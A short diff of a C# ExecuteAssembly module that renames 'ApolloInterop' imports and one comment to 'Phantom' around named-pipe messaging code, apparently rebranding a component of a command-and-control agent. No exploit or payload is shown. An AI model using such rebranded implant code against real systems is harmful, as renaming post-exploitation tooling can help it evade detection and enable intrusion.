@@ -1,12 +1,12 @@
-﻿using ApolloInterop.Classes;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Classes.IO;
-using ApolloInterop.Constants;
-using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Serializers;
-using ApolloInterop.Structs.ApolloStructs;
+﻿using PhantomInterop.Classes;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Classes.IO;
+using PhantomInterop.Constants;
+using PhantomInterop.Enums.PhantomEnums;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Serializers;
+using PhantomInterop.Structs.PhantomStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -75,7 +75,7 @@ namespace ExecuteAssembly
                     pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                 }
 
-                // Wait for all messages to be read by Apollo
+                // Wait for all messages to be read by Phantom
                 pipe.WaitForPipeDrain();
                 pipe.Close();
             };
